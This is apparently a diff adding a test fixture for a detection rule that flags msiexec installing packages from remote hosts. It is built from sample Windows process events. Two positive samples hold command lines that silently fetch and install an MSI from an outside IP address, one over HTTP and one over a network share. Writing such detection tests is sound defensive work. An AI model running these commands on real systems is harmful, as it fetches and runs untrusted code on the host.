@@ -1,0 +1,36 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: msiexec.exe, executable: 'C:\Windows\System32\msiexec.exe', command_line: 'msiexec /q /i http://203.0.113.9/x.msi'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: msiexec.exe, executable: 'C:\Windows\System32\msiexec.exe', command_line: msiexec /i \\203.0.113.9\s\x.msi
+        /qn}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: msiexec.exe, executable: 'C:\Windows\System32\msiexec.exe', command_line: 'msiexec /i C:\Setup\x.msi'}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: msiexec.exe, executable: 'C:\Windows\System32\msiexec.exe', command_line: msiexec /V}
